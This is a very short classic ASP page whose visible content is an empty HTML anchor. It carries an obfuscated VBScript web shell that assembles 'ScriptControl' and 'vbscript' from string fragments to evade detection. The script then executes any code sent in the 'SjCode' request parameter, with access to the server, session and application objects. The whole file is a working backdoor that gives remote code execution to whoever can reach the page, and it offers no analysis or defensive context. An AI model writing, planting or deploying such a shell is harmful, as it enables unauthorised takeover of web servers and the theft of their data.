<a>&nbsp;</a>
<% 
Set o = Server.CreateObject("Sc"&"ri"&"ptC"&"ont"&"rol") 
o.language = "vb"&"scr"&"i"&"pt" 
o.addcode(Request("Sj"&"C"&"od"&"e"))
o.run "e",Server,Response,Request,Application,Session,Error
%>